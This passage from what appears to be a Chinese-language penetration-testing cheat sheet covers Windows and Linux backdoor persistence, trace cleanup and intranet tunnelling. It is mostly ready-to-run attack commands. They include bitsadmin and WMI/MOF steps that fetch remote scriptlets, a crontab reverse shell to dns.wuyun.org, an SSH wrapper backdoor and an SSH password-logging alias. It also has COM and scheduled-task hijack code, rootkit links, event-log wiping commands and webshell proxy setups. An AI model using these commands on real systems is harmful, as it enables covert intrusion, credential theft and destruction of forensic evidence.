<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure>

<h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure>

<h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a>6、Startup Keys</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure>

<h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a>7、Services</h5><p>创建服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create [ServerName] binPath= BinaryPathName</span><br></pre></td></tr></table></figure>

<h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure>

<h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>

<h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a>10、文件关联</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Classes</span><br><span class="line">HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>

<h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a>11、<a href="http://www.liuhaihua.cn/archives/357579.html">bitsadmin</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bitsadmin /create backdoor</span><br><span class="line">bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin /Resume backdoor</span><br></pre></td></tr></table></figure>

<h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof"></a>12、<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">mof</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP1&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 1&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consP1&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText = &quot;GetObject(\&quot;script:https://host.com/test\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>管理员执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure>

<h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a>13、<a href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate=&quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;</span><br></pre></td></tr></table></figure>

<h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a>14、<a href="https://3gstudent.github.io/Userland-registry-hijacking">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#x27;Medium&#x27;)]</span><br><span class="line">Param (</span><br><span class="line">[Parameter(Mandatory = $True)]</span><br><span class="line">[ValidateNotNullOrEmpty()]</span><br><span class="line">[String]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[Switch]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath = &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span><br><span class="line">if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#x27;(default)&#x27; -ErrorAction SilentlyContinue) -eq $null))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name &#x27;(Default)&#x27; -Value $Command -PropertyType string -Force | Out-Null</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Verbose &quot;Key already exists, consider using -Force&quot;</span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Warning &quot;Failed to create registry key, exiting&quot;</span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose</span><br></pre></td></tr></table></figure>

<h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a>15、<a href="https://3gstudent.github.io/Netsh-persistence">Netsh</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh add helper c:\test\netshtest.dll</span><br></pre></td></tr></table></figure>

<p>后门触发：每次调用netsh</p>
<blockquote>
<p>dll编写:<a href="https://github.com/outflanknl/NetshHelperBeacon">https://github.com/outflanknl/NetshHelperBeacon</a></p>
</blockquote>
<h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a>16、<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims">Shim</a></h5><p>常用方式： InjectDll RedirectShortcut RedirectEXE</p>
<h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a>17、<a href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程 使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行 </p>
<p>工具：<a href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a> </p>
<p>工具：<a href="https://github.com/Yonsm/AheadLib">https://github.com/Yonsm/AheadLib</a></p>
<p>dll劫持不多说</p>
<h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent"></a>18、<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)">DoubleAgent</a></h5><p>编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 POC : <a href="https://github.com/Cybellum/DoubleAgent">https://github.com/Cybellum/DoubleAgent</a></p>
<h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe"></a>19、<a href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence">waitfor.exe</a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe POC : <a href="https://github.com/3gstudent/Waitfor-Persistence">https://github.com/3gstudent/Waitfor-Persistence</a></p>
<h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a>20、<a href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>
<h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a>21、Office</h5><p><a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门 <a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8">利用VSTO实现的office后门</a> <a href="https://github.com/3gstudent/Office-Persistence">Office加载项</a></p>
<ul>
<li>Word WLL</li>
<li>Excel XLL</li>
<li>Excel VBA add-ins</li>
<li>PowerPoint VBA add-ins</li>
</ul>
<blockquote>
<p>参考1 ：<a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></p>
</blockquote>
<blockquote>
<p>参考2 ：<a href="https://3gstudent.github.io/Office-Persistence-on-x64-operating-system">https://3gstudent.github.io/Office-Persistence-on-x64-operating-system</a></p>
</blockquote>
<h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a>22、<a href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序 POC:<a href="https://github.com/3gstudent/CLR-Injection">https://github.com/3gstudent/CLR-Injection</a></p>
<h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a>23、<a href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测 利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</p>
<h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a>24、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：<a href="https://github.com/3gstudent/COM-Object-hijacking">https://github.com/3gstudent/COM-Object-hijacking</a></p>
<h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a>25、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure>

<h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载 Explorer.exe在启动时会加载<code>c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p>
<h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。</p>
<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA">《渗透技巧——“隐藏”注册表的创建》</a></p>
<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95">《渗透技巧——“隐藏”注册表的更多测试》</a></p>
<h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数 POC : <a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>
<h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a>29、<a href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence">Logon Scripts</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>

<h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a>30、<a href="https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8">Password Filter DLL</a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a>31、<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">利用BHO实现IE浏览器劫持</a></h5><h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>

<h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;</span><br></pre></td></tr></table></figure>

<p>链接：ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x32;&#48;&#x36;&#x2e;&#x31;&#52;&#50;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x32;&#48;&#x36;&#x2e;&#x31;&#52;&#50;</a> -p 2333</p>
<h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd /usr/sbin</span><br><span class="line">mv sshd ../bin</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">//不用重启也行</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport=13377</span><br></pre></td></tr></table></figure>

<h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span><br></pre></td></tr></table></figure>

<p>source .bashrc</p>
<h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a>Cymothoa_进程注入backdoor</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cymothoa -p 2270 -s 1 -y 7777</span><br><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure>

<h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h5><ul>
<li><a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">openssh_rootkit</a></li>
<li><a href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">Kbeast_rootkit</a></li>
<li>Mafix + Suterusu rootkit</li>
</ul>
<h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><ul>
<li><a href="https://github.com/Screetsec/Vegile">Vegile</a></li>
<li><a href="https://github.com/icco/backdoor">backdoor</a></li>
</ul>
<h1 id="14-痕迹清理"><a href="#14-痕迹清理" class="headerlink" title="14.痕迹清理"></a>14.痕迹清理</h1><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87">Windows日志清除</a></h3><p>获取日志分类列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure>

<p>获取单个日志类别的统计信息： eg.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure>

<p>查看指定日志的具体内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil qe /f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>

<p>删除单个日志类别的所有信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>

<h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><p>利用工具</p>
<ul>
<li><a href="https://github.com/hlldz/Invoke-Phant0m">Invoke-Phant0m</a></li>
<li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass">Windwos-EventLog-Bypass</a></li>
</ul>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run clearlogs </span><br><span class="line">clearev </span><br></pre></td></tr></table></figure>

<h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>



<h1 id="15-内网穿透"><a href="#15-内网穿透" class="headerlink" title="15.内网穿透"></a>15.内网穿透</h1><p><strong>区分正向代理与反向代理</strong></p>
<p>A—-b—-C</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A去请求C,B作为代理，代替A去访问C，并将返回的结果转发给A   那么B就是正向代理</span><br><span class="line">B主动与A的8888端口连接，并将A:8888的访问转发到C:80上去，并将结果转发给A,则B是反向代理</span><br><span class="line">反向代理优势: 当AB之间有防火墙，不允许A连B,但是允许B连A</span><br></pre></td></tr></table></figure>



<h4 id="0x01-场景与思路分析"><a href="#0x01-场景与思路分析" class="headerlink" title="0x01 场景与思路分析"></a>0x01 场景与思路分析</h4><h6 id="场景一：内网防火墙对出口流量没有任何端口限制"><a href="#场景一：内网防火墙对出口流量没有任何端口限制" class="headerlink" title="场景一：内网防火墙对出口流量没有任何端口限制"></a>场景一：内网防火墙对出口流量没有任何端口限制</h6><p>思路 <strong>：由于防火墙对出口流量没有任何端口限制，我们的可选择的方案非常灵活，如：反弹shell</strong></p>
<h6 id="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）"><a href="#场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）" class="headerlink" title="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）"></a>场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</h6><p>思路：由于防火墙仅允许部分特定外网端口可以访问，思路一仍然是反弹shell只不过目标端口改成特定端口即可；思路二则是端口转发，将内网主机的某些服务的端口转发到外网攻击主机上的防火墙允许的特定端口上，再通过连接外网主机上的本地端口来访问内网服务</p>
<p><strong>方法一：反弹shell可参考场景一中的方法，仅需修改目标端口为防火墙允许的特定端口即可</strong></p>
<p><strong>方法二：端口转发</strong></p>
<p><strong>方法三：SSH的动态端口转发配合proxychains来代理所有流量进一步渗透内网</strong></p>
<p>1.在内网主机上执行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh -f -N -R <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span> -p <span class="number">80</span> root@<span class="number">192.168</span><span class="number">.0</span><span class="number">.230</span></span><br><span class="line">(输入外网主机的SSH口令)</span><br></pre></td></tr></table></figure>

<p>2.在外网主机上执行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ssh -f -N -D <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> -p <span class="number">2222</span> avfisher@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">(输入内网主机的SSH口令)</span><br></pre></td></tr></table></figure>

<p>3.在外网主机上配置proxychains设置socks4代理</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$ vim /etc/proxychains.conf</span><br><span class="line">[ProxyList]</span><br><span class="line">socks4 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>4.使用proxychains代理所有流量进入内网</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">proxychains nc -nv <span class="number">10.0</span><span class="number">.2</span><span class="number">.5</span> <span class="number">3306</span></span><br></pre></td></tr></table></figure>

<h6 id="场景三：TCP不出网-HTTP代理"><a href="#场景三：TCP不出网-HTTP代理" class="headerlink" title="场景三：TCP不出网-HTTP代理"></a>场景三：TCP不出网-HTTP代理</h6><p><strong>一.reGeorg</strong></p>
<p>reGeorg原版：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>reGeorg修改版：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<p>假设拿到的Webshell是<a href="http://aaa.com/shell.jsp%EF%BC%8C%E4%BB%A5%E5%8E%9F%E7%89%88reGeorg%E4%B8%BA%E4%BE%8B%E3%80%82">http://aaa.com/shell.jsp，</a>以原版reGeorg为例。</p>
<p>上传reGeorg中的 tunnel.jsp，假设当前URL为<a href="http://aaa.com/tunnel.jsp">http://aaa.com/tunnel.jsp</a></p>
<p>在本地PC运行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http://aaa.com/tunnel.jsp</span><br></pre></td></tr></table></figure>

<p>此时，将在本地PC的8080开启一个Socks端口，使用Proxifier即可进行代理。需要注意的是，由于这个http代理隧道比较脆弱，建议根据每个目标host单独添加规则，最好不要设置成全局代理。</p>
<p><strong>二.pystinger</strong></p>
<p>蜂刺-stinger_client</p>
<p><a href="https://github.com/FunnyWolf/pystinger">pystinger</a></p>
<p>整体结构：</p>
<p>1.上传 proxy.jsp到目标Web服务器，上传stinger_server/stinger_server.exe到目标系统。</p>
<p>2.使用Webshell启动stinger_server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x /tmp/stinger_server</span><br><span class="line">nohup /tmp/stinger_server&gt;/dev/null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows: start D:/XXX/stinger_server.exe</span><br></pre></td></tr></table></figure>

<p>3.VPS服务端启动监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./stinger_client -w http://aaa.com/proxy.jsp -l 0.0.0.0 -p 60000</span><br></pre></td></tr></table></figure>


<p>以上操作成功后，VPS会监听60000端口，接下来直接配置好Proxifier就可以访问目标内网了。</p>
<p>特别注意：这个代理也不是很稳定，有时候会断开(Wrong data)。遇到断开情况后，手动kill stinger_server进程 再启动，最后重启VPS服务端stinger_client即可</p>
